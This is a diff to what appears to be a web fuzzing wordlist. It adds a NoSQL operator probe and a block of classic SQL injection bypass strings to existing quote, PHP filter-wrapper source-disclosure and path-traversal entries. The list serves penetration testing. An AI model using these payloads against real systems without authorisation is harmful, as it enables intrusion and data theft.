@@ -1,3 +1,4 @@
+ 
 '
 %27
 "
@@ -5,8 +6,18 @@
 \
 %5C
 {PARAM}[]=
+{PARAM}[$gt]=0
 php://filter/string.base64-encode/resource=index
 php://filter/string.rot13/resource=index
 ../
 index.php
 
+# sql injection simple test
+' or '1'='1' #
+" or "1"="1" #
+' or 0=0 -- -
+" or 0=0 -- -
+999 or 0=0 -- -
+999 or 0=0 #
+') or ('x'='x
+") or ("a"="a
